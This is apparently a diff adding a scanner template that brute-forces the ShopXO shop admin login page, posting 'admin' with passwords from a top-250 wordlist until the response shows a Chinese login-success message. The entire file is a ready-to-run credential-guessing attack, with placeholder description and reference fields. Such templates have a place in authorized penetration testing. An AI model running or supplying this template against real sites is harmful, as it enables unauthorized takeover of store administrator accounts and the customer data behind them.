@@ -1,0 +1,53 @@
+id: login-fuzz-shopxo
+
+info:
+  name: login-finger-shopxo
+  author: capiton
+  severity: high
+  description: description
+  reference:
+    - https://
+
+requests:
+  - raw:
+      - |
+        POST /admin.php?s=admin/login.html HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL5VxnPLwIBwiKB2E
+        Content-Length: 341
+
+
+        ------WebKitFormBoundaryL5VxnPLwIBwiKB2E
+        Content-Disposition: form-data; name="accounts"
+
+        {{username}}
+        ------WebKitFormBoundaryL5VxnPLwIBwiKB2E
+        Content-Disposition: form-data; name="pwd"
+
+        {{password}}
+        ------WebKitFormBoundaryL5VxnPLwIBwiKB2E
+        Content-Disposition: form-data; name="type"
+
+        username
+        ------WebKitFormBoundaryL5VxnPLwIBwiKB2E--
+
+    attack: clusterbomb
+    payloads:
+      username: 
+        - admin
+      password: "0.local/helpers/wordlists/password-TOP250"
+
+    threads: 5
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 登录成功
+      - type: status
+        status:
+          - 200
